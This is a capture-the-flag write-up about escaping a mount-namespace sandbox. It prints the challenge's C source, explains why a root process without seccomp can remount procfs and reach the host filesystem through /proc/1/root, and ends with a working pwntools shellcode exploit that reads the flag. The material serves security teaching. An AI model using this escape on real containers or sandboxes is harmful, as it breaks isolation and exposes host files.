#metadata(
  (
    title: "Mount Namespace Escape via Manual Procfs Mount",
    description: "Escaping a hardened mount namespace sandbox by manually mounting procfs from within the jail to access the host's root filesystem.",
    date: "2026-01-04",
    order: 18,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Mount Namespace Escape via Manual Procfs Mount

== Challenge Source Code

```c
#define _GNU_SOURCE 1
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  assert(argc > 1);

  for (int i = 3; i < 10000; i++)
    close(i);

  char new_root[] = "/tmp/jail-XXXXXX";
  char old_root[1024];

  assert(geteuid() == 0);
  assert(unshare(CLONE_NEWNS) != -1);
  assert(mkdtemp(new_root) != NULL);
  assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);
  assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);

  snprintf(old_root, sizeof(old_root), "%s/old", new_root);
  assert(mkdir(old_root, 0777) != -1);
  assert(syscall(SYS_pivot_root, new_root, old_root) != -1);

  // Bind-mount user directory
  assert(mkdir("/data", 0755) != -1);
  char dirpath[1024];
  snprintf(dirpath, 1024, "/old%s", argv[1]);
  assert(mount(dirpath, "/data", NULL, MS_BIND, NULL) != -1);
  assert(mount(NULL, "/data", NULL, MS_REMOUNT | MS_RDONLY | MS_BIND, NULL) != -1);

  // Unmount the old root directory
  assert(umount2("/old", MNT_DETACH) != -1);
  assert(rmdir("/old") != -1);

  setresuid(0, 0, 0);
  assert(chdir("/") == 0);

  int fffd = open("/flag", O_WRONLY | O_CREAT);
  write(fffd, "try harder", 10);
  close(fffd);

  void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, 0, 0);
  read(0, shellcode, 0x1000);
  ((void (*)())shellcode)();
}
```

== Vulnerability Analysis

In this level, the sandbox is quite robust: it uses a mount namespace, `pivot_root`, and even unmounts the old root directory. It also doesn't pre-mount `/proc`, preventing the simple escape from the previous levels.

However, the sandbox still runs the process as `root` (UID 0) inside the namespace and does not apply any `seccomp` filters. This means the process retains the `CAP_SYS_ADMIN` capability within its namespace, allowing it to perform mount operations.

Since we can still call `mount`, we can manually mount the **proc filesystem** inside our jail. Once `procfs` is mounted, we can again leverage the `/proc/1/root` symlink to access the host's filesystem.

== Exploitation Plan

1. **Mount Procfs:** Create a temporary directory (e.g., `/p`) and mount `proc` to it using the `mount` syscall.
2. **Access Host Root:** Use the newly mounted procfs to traverse process 1's root link: `/p/1/root/`.
3. **Read Flag:** Read the real flag at `/p/1/root/flag`.

== Exploit Script

```python
from pwn import *

elf = context.binary = ELF("./challenge")

# Run with a harmless directory to satisfy argv[1] checks
p = process([elf.path, "/opt/caido"])

# Shellcode to:
# 1. mkdir("/p")
# 2. mount("proc", "/p", "proc", 0, 0)
# 3. open("/p/1/root/flag", O_RDONLY)
# 4. sendfile(1, 'rax', 0, 100)
# 5. exit(0)

sc = shellcraft.mkdir("/p")
sc += shellcraft.mount("proc", "/p", "proc", 0, 0)
sc += shellcraft.open("/p/1/root/flag", 0)
sc += shellcraft.sendfile(1, 'rax', 0, 100)
sc += shellcraft.exit(0)

p.send(asm(sc))
print(p.recvall().decode())
```
